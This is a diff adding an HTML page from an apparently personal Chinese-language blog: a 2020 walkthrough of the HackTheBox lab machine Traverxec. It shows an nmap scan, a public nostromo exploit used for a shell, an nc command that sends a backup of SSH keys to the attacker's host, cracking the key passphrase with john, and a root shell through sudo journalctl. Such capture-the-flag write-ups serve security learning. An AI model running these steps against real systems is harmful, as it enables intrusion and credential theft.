@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Traverxec |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-kgz3n7" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      Traverxec
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/03/05/kgz3n7/" class="article-date">
+  <time datetime="2020-03-05T06:58:15.000Z" itemprop="datePublished">2020-03-05</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583392151788-97534816-aa9c-4d16-9cb7-07479ef6a4c4.png#align=left&display=inline&height=423&name=image.png&originHeight=845&originWidth=1548&size=205804&status=done&style=none&width=774" alt="image.png"></p>
+<p>常规扫端口：<br><code>nmap -A -sC 10.10.10.165</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583394361715-4e861fdc-9d64-42e1-897a-e1cafbb5036d.png#align=left&display=inline&height=424&name=image.png&originHeight=654&originWidth=905&size=150593&status=done&style=none&width=587" alt="image.png"></p>
+<p>访问 80  端口，发现有个发邮件的功能</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583394624970-990349f0-53b4-4063-bd09-4c7390db1674.png#align=left&display=inline&height=367&name=image.png&originHeight=733&originWidth=1282&size=57414&status=done&style=none&width=641" alt="image.png"></p>
+<p>发现它的中间件是  nostromo 1.9.6</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583394802670-31c2f533-3d73-4363-b9c5-cdacaccfa308.png#align=left&display=inline&height=255&name=image.png&originHeight=509&originWidth=1273&size=146299&status=done&style=none&width=636.5" alt="image.png"></p>
+<p>搜一下  exp</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583395109759-00a10a2f-8b57-4a63-add4-31199da94278.png#align=left&display=inline&height=334&name=image.png&originHeight=667&originWidth=1293&size=90351&status=done&style=none&width=646.5" alt="image.png"></p>
+<p>exp 直接利用，得到  www-data  权限的 shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583396236352-90c4c72f-6bd9-48d1-b40a-5d233655f883.png#align=left&display=inline&height=205&name=image.png&originHeight=326&originWidth=1056&size=70811&status=done&style=none&width=663" alt="image.png"></p>
+<p>看一下 /etc/passwd，发现有个叫  david  的用户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583397030862-782e9fe5-6c4d-4947-b220-e2508d4425f3.png#align=left&display=inline&height=401&name=image.png&originHeight=586&originWidth=914&size=138716&status=done&style=none&width=626" alt="image.png"></p>
+<p>可以使用：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>来生成一个比较好看的终端样子，就像下面这样</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583398172841-627f8082-9d3c-4808-8f90-04060fde90f7.png#align=left&display=inline&height=51&name=image.png&originHeight=49&originWidth=463&size=9641&status=done&style=none&width=471" alt="image.png"></p>
+<p>cd  到 /var/nostromo/conf  看一下有啥，<code>ls -al</code>  起码要用 -a  啊，不要错过什么东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583398814653-41c6306a-4d2d-4a0e-9dc0-77c7d0f82b95.png#align=left&display=inline&height=153&name=image.png&originHeight=200&originWidth=554&size=40014&status=done&style=none&width=425" alt="image.png"></p>
+<p>cat  一下  nhttpd.conf ，发现了一个叫  public_www  的文件夹</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583399234143-61a43955-e78f-46aa-8ee2-5e8f2118ad91.png#align=left&display=inline&height=521&name=image.png&originHeight=724&originWidth=571&size=77625&status=done&style=none&width=412" alt="image.png"></p>
+<p>进去看一下：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583399399878-0fde0bfa-6bae-4069-b68c-7c68614cb024.png#align=left&display=inline&height=104&name=image.png&originHeight=133&originWidth=656&size=27071&status=done&style=none&width=515" alt="image.png"></p>
+<p>新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code>  用来接收那个压缩包<br>shell  里面使用 <code>nc 10.10.15.84 10001 &lt; backup-ssh-identity-files.tgz</code></p>
+<p>这样就把压缩包给下到本地  kali  机了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583401964294-1cc6d7d1-c1c8-4e3e-8d32-5f963ee1596e.png#align=left&display=inline&height=467&name=image.png&originHeight=933&originWidth=1658&size=739326&status=done&style=none&width=829" alt="image.png"></p>
+<p>下载出来的文件里有  ssh  的密钥</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583402001353-42977e7f-8a97-42ca-8c7a-f631a5e73bac.png#align=left&display=inline&height=315&name=image.png&originHeight=426&originWidth=597&size=48797&status=done&style=none&width=442" alt="image.png"></p>
+<p>使用  jhon  破解一下看看把</p>
+<p><code>/usr/share/john/ssh2john.py /root/Desktop/home/david/.ssh/id_rsa &gt; id_rsa.hash</code><br>先换成  jhon  能识别的格式</p>
+<p><code>/sbin/john /root/Desktop/home/david/.ssh/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</code><br>rockyou.txt  字典爆破一波</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583402473405-bb3c5066-75bf-48d0-b258-04ed088b8540.png#align=left&display=inline&height=210&name=image.png&originHeight=325&originWidth=911&size=95468&status=done&style=none&width=586" alt="image.png"></p>
+<p>得到密钥密码，hunter</p>
+<p>ssh  登录一波</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583402839327-080d626c-0edd-45ba-9291-63ce0cda4f33.png#align=left&display=inline&height=155&name=image.png&originHeight=199&originWidth=837&size=62170&status=done&style=none&width=650" alt="image.png"></p>
+<p>拿到  user.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583402889404-0e17d133-f36b-4067-8ce3-b5f8505ceae6.png#align=left&display=inline&height=151&name=image.png&originHeight=117&originWidth=330&size=16863&status=done&style=none&width=422" alt="image.png"></p>
+<p>在 bin  目录下发现其他的东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583403024851-d865e01c-d5d5-423e-be4c-0f7320038008.png#align=left&display=inline&height=132&name=image.png&originHeight=179&originWidth=608&size=35803&status=done&style=none&width=446" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583403092303-53e79061-c3e2-4f70-a939-75093e9b409a.png#align=left&display=inline&height=286&name=image.png&originHeight=385&originWidth=848&size=76067&status=done&style=none&width=631" alt="image.png"></p>
+<p>在窗口被拉小的时候会触发应用，可以获取 root 的权限</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583403051888-67c657fe-336e-4cc6-902b-4f8852ddde41.png#align=left&display=inline&height=479&originHeight=1212&originWidth=1886&size=0&status=done&style=stroke&width=746" alt=""></p>
+<p>运行 <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> 时，把窗口缩小一点，再输入!/bin/sh，成功获得 root 权限：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583403313743-6eb1c6ae-fa72-4f4d-a3ae-9a1b7179751f.png#align=left&display=inline&height=359&name=image.png&originHeight=591&originWidth=743&size=63306&status=done&style=none&width=452" alt="image.png"></p>
+<p>惊了！？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583403365329-8de1f6ed-bfcf-43dd-85a8-c4647b62b3d5.png#align=left&display=inline&height=184&name=image.png&originHeight=240&originWidth=359&size=17896&status=done&style=none&width=277" alt="image.png"></p>
+<p>参考：<br><a href="https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/" target="_blank" rel="noopener">https://ca0y1h.top/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/</a><br><a href="https://www.lofter.com/lpost/1df46e99_1c73cc6b6" target="_blank" rel="noopener">https://www.lofter.com/lpost/1df46e99_1c73cc6b6</a></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/03/05/kgz3n7/" data-id="ckco53qbd00098ou9bquk2h6m" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/03/08/yxegb6/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            pwntools使用
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/27/pehmm1/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">Postman</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
